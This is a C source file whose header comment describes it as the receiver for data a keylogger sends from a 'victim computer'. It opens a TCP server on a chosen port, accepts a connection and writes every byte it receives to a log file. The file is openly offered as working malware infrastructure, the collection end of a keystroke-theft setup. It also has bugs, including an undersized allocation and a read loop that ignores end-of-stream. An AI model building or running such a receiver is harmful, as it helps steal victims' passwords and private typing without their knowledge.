//This code will act as the reciever for whatever the keylogger is sending from the victim computer
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <errno.h>
#include <signal.h>

#define LOGFILE "tmp/data_out"

int flag = 1;

void set_flag(int sig){
	flag = 0;
}


int main(int argc, char* argv[]) {

if(argc!=2){
	printf("Usage : %s <port>\n", argv[0]);
	exit(1);
}

signal(SIGINT, set_flag);


//Create socket

int sockfd = socket(AF_INET, SOCK_STREAM, 0);


//Bind the socket

struct sockaddr_in *addr, cl_addr;

addr = (struct sockaddr_in*) malloc(sizeof(addr));
addr->sin_family = AF_INET;
addr->sin_port = htons(atoi(argv[1]));
addr->sin_addr.s_addr = htonl(INADDR_ANY);


if(bind(sockfd, (struct sockaddr*) addr, sizeof(*addr)) <= -1){
	printf("Error in binding to port \n");
	perror("error");
	return 1;
}

//Listen for incoming connections

if(listen(sockfd, 2) == -1){
	printf("Error on listen\n");
	perror("Error");
	return 1;
}



//Accept incoming connections
int cl_sock;
socklen_t cl_sock_size =  sizeof(cl_addr);
if((cl_sock = accept(sockfd, (struct sockaddr*) &cl_addr, &cl_sock_size)) <= 0){
	printf("Error accepting connection\n");
	return 1;
}

printf("Established connection\n");
//Close everything

FILE *outfile = fopen(LOGFILE, "w");
int total_bytes = 0;
char buff;
while(flag){
	total_bytes += read(cl_sock, &buff, 1);
	//printf("From client: %c\n", buff);
	fputc((int) buff, outfile);
}
close(sockfd);
close(cl_sock);
return 0;
} 